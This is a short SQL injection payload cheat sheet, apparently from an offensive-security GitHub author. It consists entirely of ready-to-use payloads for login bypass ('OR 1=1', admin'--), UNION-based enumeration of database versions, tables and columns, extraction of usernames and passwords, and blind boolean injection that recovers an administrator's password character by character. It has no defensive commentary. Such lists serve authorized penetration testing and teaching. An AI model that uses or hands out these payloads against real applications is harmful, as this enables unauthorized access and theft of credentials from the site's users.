
[Amit Sakpal](https://github.com/offsec-amit)

# --- Logic Bypass / Conditional Data Retrieval ---
' OR 1=1 -- -
' OR 1=1 #

# --- Login Bypass (Administrator) ---
admin'-- -
admin' OR 1=1 -- -

# --- IN-BAND UNION ATTACKS ---

# Column Enumeration (adjust NULLs based on ORDER BY result)
UNION SELECT NULL,NULL --

# Injecting Text (adjust NULLs and position for reflection)
UNION SELECT 'A',NULL --

# Database Version Retrieval (MySQL/PostgreSQL)
UNION SELECT VERSION(),NULL --

# Database Version Retrieval (MySQL specific, using @@VERSION)
UNION SELECT @@VERSION,NULL #

# Database Version Retrieval (Oracle)
UNION SELECT BANNER,NULL FROM V$VERSION --

# Listing Tables (MySQL/PostgreSQL)
UNION SELECT table_name,NULL FROM information_schema.tables --

# Listing Columns for a specific table (e.g., 'users' table, MySQL/PostgreSQL)
UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users' --

# Retrieving specific data (e.g., username and password from 'users' table)
UNION SELECT username,password FROM users --

# Retrieving specific data for a condition (e.g., password for 'administrator')
UNION SELECT password,NULL FROM users WHERE username = 'administrator' --

# Listing Database Contents (PostgreSQL specific, if table_u and table_p are columns in table_container)
UNION SELECT table_u,table_p FROM table_container --

# --- INFERENTIAL / BLIND SQL INJECTION ---

# Boolean-based True Condition Check
' AND 1=1 --

# Check for table existence (e.g., 'users')
' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --

# Check for specific user existence (e.g., 'admin')
' AND (SELECT username FROM users WHERE username = 'admin') = 'admin' --

# Determine password length (use with Intruder, payload for [LENGTH])
' AND (SELECT LENGTH(password) FROM users WHERE username = 'admin') > [LENGTH] --

# Extract character at specific position (use with Intruder, payload for [POSITION] and [CHAR])
' AND (SELECT SUBSTRING(password, [POSITION], 1) FROM users WHERE username = 'admin') = '[CHAR]' --
